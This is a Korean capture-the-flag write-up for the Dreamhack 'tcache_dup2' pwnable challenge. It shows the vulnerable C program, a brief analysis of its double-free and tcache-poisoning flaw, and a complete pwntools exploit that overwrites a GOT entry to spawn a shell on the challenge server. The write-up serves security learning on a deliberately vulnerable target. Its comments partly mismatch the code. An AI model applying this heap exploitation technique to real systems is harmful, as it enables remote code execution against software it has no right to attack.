---
title: "Wargame - [Dreamhack] tcache_dup2"
categories: [Wargame, pwnable]
tags: [pwnable, tcache, wargame, ptmalloc2, glibc2.3] # TAG names should always be lowercase
---

> tcache_dup2 write-up (glibc2.30)

[tcache_dup2](https://dreamhack.io/wargame/challenges/67)

## 문제의 코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[7];

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void create_heap(int idx) {
    size_t size;

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    ptr[idx] = malloc(size);

    if (!ptr[idx])
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size-1);
}

void modify_heap() {
    size_t size, idx;

    printf("idx: ");
    scanf("%ld", &idx);

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    if (size > 0x10)
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size);
}

void delete_heap() {
    size_t idx;

    printf("idx: ");
    scanf("%ld", &idx);
    if (idx >= 7)
        exit(0);

    if (!ptr[idx])
        exit(0);

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}
int main() {
    int idx;
    int i = 0;

    initialize();

    while (1) {
        printf("1. Create heap\n");
        printf("2. Modify heap\n");
        printf("3. Delete heap\n");
        printf("> ");

        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create_heap(i);
                i++;
                break;
            case 2:
                modify_heap();
                break;
            case 3:
                delete_heap();
                break;
            default:
                break;
        }
    }
}
```

## Point

- heap을 할당 및 해제하는 기능을 갖는데, 사용 전후에 해당 메모리를 초기화하는 기능이 없다

- Dangling Pointer가 존재할 수 있고, 이를 수정할 수 있으므로 Tcache Poisoing이 발생할 수 있다.

- `Partial RELRO`만 적용되어 있으므로 `got overwrite`가능하다

위 분석을 토대로, 이하 시나리오를 작성할 수 있다.
```
1. Double Free로 Tcache Duplication을 발생시킨다.
2. Tcache Poisoning : `got['puts]`를 할당한다.
3. 해당 GOT table에 get_shell 주소를 삽입한다.
```

> **tc_idx**
> 
> tc_idx가 0이면 tcache가 비어있다고 판단하고 탐색하지 않는다.
{: .prompt-warning}


## Exploit Code
```python
"""
libc : 2.30
Partial RELRO
No PIE
=========================
strategy : got overwrite
Tcache Poisoning : got['free']
got['free'] overwrite to sh
"""

from pwn import *

#p = process("./tcache_dup2")
p = remote("host3.dreamhack.games", 16654)
e = ELF("./tcache_dup2")

sh = e.symbols['get_shell']

def slog(name, addr):   return success(name + ": " + hex(addr))

def alloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def modify(idx, size, data):
    # SIZE <= 0x10
    # len(data) <= size
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def free(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())

"""
ptr[0] = chunk 'aaaa'
ptr[1] = got['free']
ptr[2] = chunk 'ffff'
ptr[3] = p64(shell)
ptr[4] = chunk 'aa'
"""

slog("free@got", e.got['free'])
slog("shell", e.symbols['get_shell'])


#pause()

alloc(0x40, b'aaaa')
alloc(0x40, b'aaaa')
free(0)
free(1)
modify(1, 0x10, b'A'*8 + b'\xff')
free(1)
# tcache[0x50] -> chunk A -> chunk A
# i->1

alloc(0x40, p64(e.got['puts']))
# tcache[0x50] -> chunk A -> got['free'] -> real free addr
# i->2

alloc(0x40, b'ffff')
# tcache[0x50] -> got['free'] -> real free addr
# i->3



alloc(0x40, p64(sh))
# got['free'] -> get_shell
# tcache[0x50] -> real free addr
# -- ISSUE : got['puts'] modified to 0x00 automatically.... WHY??
# i->4
#alloc(0x30, b'aa')
#free(4)
# i->5

p.interactive()
```

